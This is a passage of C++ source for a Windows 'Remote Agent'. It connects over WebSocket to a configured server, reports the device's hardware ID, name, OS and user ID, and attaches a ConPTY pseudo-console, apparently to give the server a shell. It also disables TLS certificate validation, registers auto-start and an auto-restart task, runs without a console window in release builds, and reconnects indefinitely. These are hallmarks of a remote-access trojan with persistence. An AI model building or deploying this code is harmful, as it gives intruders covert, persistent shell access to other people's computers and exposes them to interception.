bool ConnectWebSocket(const std::string& deviceId, const std::string& deviceName) {
    printf("Connecting to WebSocket server...\n");

    g_state.hSession = WinHttpOpen(L"AgentHandler/2.0",
        WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,
        WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);

    if (!g_state.hSession) {
        printf("WinHttpOpen failed: %d\n", GetLastError());
        return false;
    }

    DWORD flags = Config::USE_SSL ? WINHTTP_FLAG_SECURE : 0;
    g_state.hConnect = WinHttpConnect(g_state.hSession, Config::SERVER_HOST,
        Config::SERVER_PORT, 0);

    if (!g_state.hConnect) {
        printf("WinHttpConnect failed: %d\n", GetLastError());
        return false;
    }

    std::string osVersion = UrlEncode(GetOSVersion());
    char versionBuf[32];
    WideCharToMultiByte(CP_UTF8, 0, Config::APP_VERSION, -1, versionBuf, sizeof(versionBuf), nullptr, nullptr);
    std::string appVersion = UrlEncode(versionBuf);

    char userIdBuf[64];
    WideCharToMultiByte(CP_UTF8, 0, Config::USER_ID, -1, userIdBuf, sizeof(userIdBuf), nullptr, nullptr);
    std::string userId = UrlEncode(userIdBuf);

    std::string query = "/?type=device&id=" + deviceId + "&name=" + UrlEncode(deviceName) + "&os=" + osVersion + "&version=" + appVersion;
    if (!userId.empty()) {
        query += "&userId=" + userId;
    }
    std::wstring wQuery(query.begin(), query.end());

    HINTERNET hRequest = WinHttpOpenRequest(g_state.hConnect, L"GET", wQuery.c_str(),
        nullptr, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, flags);

    if (!hRequest) {
        printf("WinHttpOpenRequest failed: %d\n", GetLastError());
        return false;
    }

    if (!WinHttpSetOption(hRequest, WINHTTP_OPTION_UPGRADE_TO_WEB_SOCKET, nullptr, 0)) {
        printf("WinHttpSetOption failed: %d\n", GetLastError());
        return false;
    }

    if (Config::USE_SSL) {
        DWORD securityFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
            SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
            SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
        WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &securityFlags, sizeof(securityFlags));
    }

    if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
        WINHTTP_NO_REQUEST_DATA, 0, 0, 0)) {
        printf("WinHttpSendRequest failed: %d\n", GetLastError());
        return false;
    }

    if (!WinHttpReceiveResponse(hRequest, nullptr)) {
        printf("WinHttpReceiveResponse failed: %d\n", GetLastError());
        return false;
    }

    g_state.hWebSocket = WinHttpWebSocketCompleteUpgrade(hRequest, 0);
    WinHttpCloseHandle(hRequest);

    if (g_state.hWebSocket) {
        printf("WebSocket connected successfully!\n");
        g_state.wsConnected = true;
        g_state.reconnectAttempts = 0;
        return true;
    }

    printf("WebSocket upgrade failed\n");
    return false;
}

void Cleanup(bool fullCleanup) {
    if (fullCleanup) {
        g_state.running = false;
    }

    if (g_state.hWebSocket) {
        WinHttpWebSocketClose(g_state.hWebSocket, WINHTTP_WEB_SOCKET_SUCCESS_CLOSE_STATUS, nullptr, 0);
        WinHttpCloseHandle(g_state.hWebSocket);
        g_state.hWebSocket = nullptr;
    }
    if (g_state.hConnect) {
        WinHttpCloseHandle(g_state.hConnect);
        g_state.hConnect = nullptr;
    }
    if (g_state.hSession) {
        WinHttpCloseHandle(g_state.hSession);
        g_state.hSession = nullptr;
    }

    if (fullCleanup) {
        if (g_state.hProcess != INVALID_HANDLE_VALUE) {
            TerminateProcess(g_state.hProcess, 0);
            CloseHandle(g_state.hProcess);
            g_state.hProcess = INVALID_HANDLE_VALUE;
        }
        if (g_state.hPseudoConsole && g_ClosePseudoConsole) {
            g_ClosePseudoConsole(g_state.hPseudoConsole);
            g_state.hPseudoConsole = nullptr;
        }
        if (g_state.hPipeIn != INVALID_HANDLE_VALUE) {
            CloseHandle(g_state.hPipeIn);
            g_state.hPipeIn = INVALID_HANDLE_VALUE;
        }
        if (g_state.hPipeOut != INVALID_HANDLE_VALUE) {
            CloseHandle(g_state.hPipeOut);
            g_state.hPipeOut = INVALID_HANDLE_VALUE;
        }
    }

    g_state.wsConnected = false;
}

int GetReconnectDelay() {
    if (!Config::USE_EXPONENTIAL_BACKOFF) {
        return Config::RECONNECT_DELAY_MS;
    }

    int delay = Config::RECONNECT_DELAY_MS * (1 << std::min(g_state.reconnectAttempts, 6));
    return std::min(delay, Config::RECONNECT_BACKOFF_MAX_MS);
}

#ifdef _DEBUG
int main() {
#else
#ifdef UNICODE
int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow) {
#else
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR pCmdLine, int nCmdShow) {
#endif
#endif
    wchar_t exePath[MAX_PATH];
    GetModuleFileNameW(nullptr, exePath, MAX_PATH);

    printf("=== Remote Agent Starting ===\n");
    printf("Debug Mode: %s\n", Config::DEBUG_MODE ? "ON" : "OFF");
    printf("Auto-Start: %s\n", Config::AUTO_START ? "ON" : "OFF");
    printf("Auto-Restart: %s\n", Config::AUTO_RESTART_ON_CRASH ? "ON" : "OFF");
    printf("Max Reconnect Attempts: %s\n", Config::MAX_RECONNECT_ATTEMPTS == 0 ? "INFINITE" : std::to_string(Config::MAX_RECONNECT_ATTEMPTS).c_str());

    // Initialize GDI+
    GdiplusStartupInput gdiplusStartupInput;
    GdiplusStartup(&g_state.gdiplusToken, &gdiplusStartupInput, NULL);

    InitMetrics();

    SetAutoStart(exePath);
    CreateAutoRestartTask(exePath);

    std::string deviceId = GetHWID();
    std::string deviceName = GetDeviceName();
    g_state.currentDeviceId = deviceId;

    printf("Device ID: %s\n", deviceId.c_str());
    printf("Device Name: %s\n", deviceName.c_str());
    printf("==============================\n\n");

    if (!CreateConPTY()) {
        printf("Failed to create ConPTY. Exiting...\n");
        return 1;
    }

    std::thread outputThread(ReadPTYOutput);

    while (g_state.shouldReconnect && g_state.running) {
        if (Config::MAX_RECONNECT_ATTEMPTS > 0 &&
            g_state.reconnectAttempts >= Config::MAX_RECONNECT_ATTEMPTS) {
            printf("Max reconnection attempts (%d) reached. Exiting...\n",
                Config::MAX_RECONNECT_ATTEMPTS);
            break;
        }

        if (g_state.reconnectAttempts > 0) {
            int delay = GetReconnectDelay();
            printf("\nReconnection attempt %d", g_state.reconnectAttempts + 1);
            if (Config::MAX_RECONNECT_ATTEMPTS > 0) {
                printf("/%d", Config::MAX_RECONNECT_ATTEMPTS);
            }
            printf(" (waiting %d ms)...\n", delay);
            Sleep(delay);
        }

        g_state.reconnectAttempts++;

        if (ConnectWebSocket(deviceId, deviceName)) {
            printf("Connected! Starting WebSocket receive loop...\n");

            std::thread keepAliveThread(KeepAliveThread);

            WebSocketReceiveLoop();

            printf("WebSocket disconnected. Cleaning up...\n");

            if (keepAliveThread.joinable()) {
                keepAliveThread.join();
            }

            Cleanup(false);
        }
        else {
            printf("Failed to connect to WebSocket\n");
            Cleanup(false);
        }

        if (!g_state.running) {
            printf("Application shutting down...\n");
            break;
        }
    }

    printf("\n=== Shutting down ===\n");
    Cleanup(true);

    if (outputThread.joinable()) {
        outputThread.join();
    }

    printf("Cleanup complete. Goodbye!\n");
    return 0;
}